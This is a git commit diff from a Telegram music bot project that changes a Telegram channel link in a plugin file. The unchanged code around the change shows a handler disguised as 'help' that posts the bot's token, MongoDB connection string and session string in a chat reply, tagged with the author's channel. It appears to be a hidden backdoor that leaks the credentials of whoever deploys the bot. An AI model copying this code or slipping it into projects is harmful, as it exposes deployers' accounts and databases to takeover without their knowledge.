cf8351ecfecfb466547b78166af39c119405bbd3
VENOM <venommusic91@gmail.com>
2025-02-17 13:09:26 +0530

    ᴀᴀʀᴠɪ ᴍᴜsɪᴄ

--- AARVIMUSIC/plugins/tools/reload.py
+++ AARVIMUSIC/plugins/tools/reload.py
@@ -113,12 +113,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Venom_p_queen)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Vampiree_queen)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• AARVIGRAMMER •", url=f"https://t.me/Venom_p_queen")
+                         "• AARVIGRAMMER •", url=f"https://t.me/Vampiree_queen")
                  ]
             ]
          ),
